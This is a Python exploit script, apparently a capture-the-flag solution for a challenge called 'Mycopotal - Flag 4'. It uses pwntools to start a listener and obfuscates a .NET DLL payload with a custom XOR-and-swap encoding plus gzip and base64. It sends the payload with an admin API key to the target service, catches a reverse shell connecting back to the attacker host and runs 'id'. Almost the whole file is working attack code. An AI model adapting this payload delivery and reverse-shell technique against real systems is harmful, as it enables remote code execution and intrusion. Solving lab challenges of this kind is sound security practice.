#!/bin/env python

"""
Mycopotal - Flag 4

This flag is essentially the same as flag 1, but now that the player has a proper .NET environment
setup, the DLL is sent in-line and this time there is no setter. The DLL must be tailor made
to send the shell directly to shell.ctf on the right port.
"""

from gzip import compress
from base64 import b64encode
from urllib.parse import quote
from os import path, chdir

from requests import Session
import threading
from pwn import *

import threading

KEY = 'FLAG-d9cf1c1ac494062e44d60902769441070113dca8'  # Flag 3 (Obtained by 3.py)
RHOST = 'avatars.mycoportal.ctf'
RPORT = 7171

LPORT=8888


def swap(d, i, j):
    t = d[j]
    d[j] = d[i]
    d[i] = t


from binascii import hexlify
def encode(data):
    # Encode()
    #print(len(data))
    data = bytearray(data)
    k = bytearray([0xba, 0xad, 0xf0, 0x0d])
    
    #print(hexdump(data[:100]))
    
    i = 0
    while i < len(data):
    # for i in range(len(data)):
        if ((i + 1) < len(data)) and (i + 1) % 25 == 0:
            swap(data, i, i+1)
        
        s = (data[i] & 0xc0) >> 6
        data[i] = data[i] ^ k[i % len(k)]

        #print(s)
        if    s == 0x01: 
            swap(k, 1, 0)
        elif  s == 0x02: 
            swap(k, 2, 3)
        elif  s == 0x03: 
            swap(k, 3, 0)
        i += 1
    
    gzipped = compress(bytes(data))
    encoded = b64encode(gzipped)
    return encoded


PAYLOAD_PATH = 'Payloads.dll'

def main():
    with open(PAYLOAD_PATH, 'rb') as f:
        data = f.read()
        payload = encode(data)
        srv = tcp(RHOST, RPORT)

        info("Listening on 8888")
        shell = listen(8888, '::')
        sleep(1)
        info("Sending payload")
        payload = '{' + f'"Type": 4, "Username": "admin", "ApiKey": "{KEY}", "Name": "pwned", "Data": "{str(payload, encoding="utf8")}"' + '}'
        info("PAYLOAD: " + payload)
        srv.sendline(payload)
        shell.wait_for_connection()
        success("Got connect back!")
        shell.recvuntil('$')
        shell.sendline("id")
        shell.recvline()
        print(str(shell.recvline(), encoding='utf8'))

main()